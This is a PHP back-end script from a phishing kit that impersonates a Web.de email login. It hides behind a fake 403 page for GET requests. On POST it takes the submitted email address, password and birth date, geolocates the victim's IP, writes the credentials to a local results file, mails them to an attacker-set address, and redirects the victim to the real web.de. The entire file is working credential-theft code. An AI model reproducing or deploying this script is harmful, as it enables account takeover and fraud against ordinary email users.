<?php
session_start();
include_once 'mail.php';
require_once('geoplugin.class.php');

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}

//Function to get the client ip address
function get_client_ip_server() {
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
		$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
		$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}else{
		$ipaddress = $_SERVER['REMOTE_ADDR'];
	}
	return $ipaddress;
}
$_SESSION['UserID'] = $_POST['UserID'];
$_SESSION['Password'] = $_POST['Password'];
$_SESSION['birthDate'] = $_POST['birthDate'];
$UserID = $_SESSION['UserID'];
$Password = $_SESSION['Password'];
$birthDate = $_SESSION['birthDate'];
$split = explode("@", $email);

$ip = get_client_ip_server();
$geoplugin = new geoPlugin();
$geoplugin->locate($ip);
$country = $geoplugin->countryName;
$region = $geoplugin->region;
$city = $geoplugin->city;
$useragent = $_SERVER['HTTP_USER_AGENT'];

$message = "";
$message .= "===============|LoGin Web.de by JoCk|==============\n";
$message .= "Email   : ".$UserID."\n";
$message .= "Password : ".$Password."\n";
$message .= "User Agent: ".$useragent."\n";
$message .= "IP: ".$ip."\n";
$message .= "===============|Done|==============\n";
$send = "";
$subject = "Log-Web.de  |.@$split[1]|$country";
$file = fopen("./cool.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 
$headers = "From: no-reply@$split[1]\n";
$headers .= "MIME-Version: 1.0\n";

mail($emailResult,$subject,$message,$headers); 

header("Location: https://web.de/");

?>
